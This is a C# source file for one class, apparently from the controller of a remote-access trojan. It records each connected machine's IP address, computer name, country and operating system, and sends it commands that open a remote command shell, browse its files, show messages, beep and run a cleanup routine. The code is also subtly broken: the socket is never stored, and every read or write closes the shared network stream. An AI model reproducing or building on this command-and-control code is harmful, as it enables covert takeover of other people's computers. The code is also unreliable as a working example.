using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System.Collections;
using System.IO;
using System.Threading;

namespace Tree_Of_Life
{
    public class Branch
    {
        public Socket socket { get; set; }
        public int id { get; set; }
        public string ip { get; set; }
        public bool online { get; set; }
        public string compName { get; set; }
        public string OS { get; set; }
        public string country { get; set; }
        public NetworkStream stream { get; set; }

        public Branch(string ip, string compName, string country, bool online, string OS, Socket socket)
        {
            this.ip = ip;
            this.compName = compName;
            this.country = country;
            this.online = online;
            this.OS = OS;
            this.stream = new NetworkStream(socket);
        }

        public void SendCommand(int command)
        {
            StreamWriter writer = new StreamWriter(stream);
            writer.Write(command);
            writer.Close();
        }

        public void Send(string Message)
        {
            StreamWriter writer = new StreamWriter(stream);
            SendCommand(1);
            writer.Write(Message);
            writer.Close();
        }

        public void Send()
        {
            StreamWriter writer = new StreamWriter(stream);
            SendCommand(1);
            SendMessage message = new SendMessage(writer);
            message.Show();
            writer.Close();
        }

        public void Beep(string data)
        {
            StreamWriter writer = new StreamWriter(stream);
            SendCommand(2);
            writer.WriteLine(data);
            writer.Close();
        }

        public void GetCMD()
        {
            SendCommand(7);
            CommandLine cmdline = new CommandLine(stream);
            cmdline.Show();
        }

        public void Explorer()
        {
            SendCommand(6);
            FileExplorerViewer viewer = new FileExplorerViewer(stream);
            viewer.Show();
        }

        public void CleanUp()
        {
            SendCommand(10);
        }

        public void Write(string data)
        {
            StreamWriter writer = new StreamWriter(stream);
            writer.WriteLine(data);
            writer.Close();
        }

        public string Read()
        {
            StreamReader reader = new StreamReader(stream);
            string data =  reader.ReadLine();
            reader.Close();
            return data;
        }
    }
}